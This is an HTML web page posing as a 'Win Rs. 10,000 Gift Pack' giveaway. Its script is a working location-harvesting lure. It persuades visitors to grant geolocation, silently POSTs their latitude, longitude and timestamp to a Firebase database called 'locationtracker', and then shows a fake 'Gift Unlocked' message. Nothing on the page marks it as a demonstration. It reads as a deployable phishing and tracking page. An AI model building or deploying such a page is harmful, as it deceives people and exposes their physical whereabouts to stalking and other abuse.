<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Special Gift Offer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      background-color: #f4f4f9;
    }
    .card {
      background: #ffffff;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 450px;
      width: 100%;
    }
    h2 { color: #ff5722; margin-bottom: 10px; }
    p { color: #555; font-size: 15px; line-height: 1.5; }
    button {
      background-color: #28a745;
      color: white;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 15px;
      font-weight: bold;
    }
    button:hover { background-color: #218838; }
    #status { margin-top: 15px; font-size: 14px; color: #333; font-weight: bold; }
  </style>
</head>
<body>

  <div class="card">
    <h2>🎉 Win Rs. 10,000 Gift Pack!</h2>
    <p>Click the button below, allow location access, and claim your exclusive 10,000 PKR gift pack right now!</p>
    <button onclick="sendLocationToFirebase()">Claim Your Gift</button>
    <div id="status"></div>
  </div>

  <script>
    function sendLocationToFirebase() {
      const statusDiv = document.getElementById('status');

      if ("geolocation" in navigator) {
        statusDiv.innerText = "Verifying location for your gift...";

        navigator.geolocation.getCurrentPosition(
          (position) => {
            const locationData = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              time: new Date().toLocaleString()
            };

            const firebaseURL = "https://locationtracker-d7218-default-rtdb.firebaseio.com/visitors.json";

            fetch(firebaseURL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(locationData)
            })
            .then(response => {
              if (response.ok) {
                statusDiv.innerText = "Congratulations! Gift Unlocked Successfully!";
              } else {
                statusDiv.innerText = "Error processing gift.";
              }
            })
            .catch(error => {
              statusDiv.innerText = "Connection failed.";
            });
          },
          (error) => {
            statusDiv.innerText = "Permission denied! Gift cannot be claimed.";
          }
        );
      } else {
        statusDiv.innerText = "Browser not supported.";
      }
    }
  </script>

</body>
</html>
